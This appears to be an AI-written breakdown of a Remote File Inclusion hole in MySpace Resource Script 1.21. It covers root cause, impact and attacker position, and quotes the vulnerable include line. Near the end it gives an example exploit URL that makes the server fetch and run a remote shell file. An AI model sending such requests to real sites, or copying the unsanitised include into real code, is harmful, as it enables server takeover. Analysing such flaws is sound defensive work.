Based on the provided content, here's the breakdown of the vulnerability:

*   **Root cause of vulnerability:** The vulnerability lies in the `breadcrumb.php` file of the MySpace Resource Script (MSRS) version 1.21. The script uses an include statement with a variable `$rootBase` that can be controlled by a user, allowing for the inclusion of remote files.
*   **Weaknesses/vulnerabilities present:** The primary vulnerability is **Remote File Inclusion (RFI)**. The application does not properly sanitize the input to the `$rootBase` variable, allowing an attacker to inject a URL pointing to a malicious file, which will then be executed by the server.
*   **Impact of exploitation:** Successful exploitation of this vulnerability can lead to:
    *   Remote code execution on the server. An attacker can include and execute arbitrary code from a remote server.
    *   Compromise of the server and potential access to sensitive data
*   **Attack vectors:** The attack vector is through a web request to the vulnerable script `/_theme/breadcrumb.php`.
*   **Required attacker capabilities/position:** An attacker needs to be able to send a request to the vulnerable server and have access to a web server where they can host a malicious file. No special privileges on the victim server are required. The attacker can be remote.

**Technical Details:**
The vulnerable code is in `/_theme/breadcrumb.php` at line 3, which is:
```php
<?php include($rootBase . '/_inc/breadcrumb.php'); ?>
```
The `$rootBase` variable is supplied via a GET request parameter, so an attacker could manipulate the URL with a malicious URL for rootBase, e.g., `http://site.com/_theme/breadcrumb.php?rootBase=http://domain.com/shell.txt?`

This makes it possible for a malicious attacker to execute arbitrary code on the server.
